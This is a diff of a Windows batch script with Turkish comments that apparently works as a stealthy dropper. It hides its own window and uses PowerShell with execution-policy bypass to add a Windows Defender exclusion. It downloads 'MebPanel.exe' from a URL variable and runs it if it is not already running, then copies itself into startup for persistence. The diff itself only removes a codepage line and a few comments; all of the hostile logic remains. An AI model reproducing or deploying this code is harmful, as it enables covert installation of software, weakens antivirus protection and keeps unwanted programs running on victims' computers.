@@ -1,5 +1,4 @@
 @echo off
-chcp 65001 >nul
 
 :: Gizli mod
 if not "%1"=="hidden" (
@@ -22,18 +21,16 @@ powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreferenc
 
 :: Kontrol: MebPanel.exe var mı?
 if not exist "%EXEFILE%" (
-    :: Yoksa indir
     powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%EXEFILE%' -UseBasicParsing" >nul 2>&1
 )
 
 :: Çalışıyor mu kontrol et
 tasklist | findstr /I "MebPanel.exe" >nul
 if %ERRORLEVEL% NEQ 0 (
-    :: Çalışmıyorsa başlat
     start "" "%EXEFILE%"
 )
 
-:: BAT dosyasını başlangıca ekle (kendini)
+:: Başlangıca ekle
 if not exist "%BATFILE%" (
     copy "%~f0" "%BATFILE%" >nul 2>&1
 )
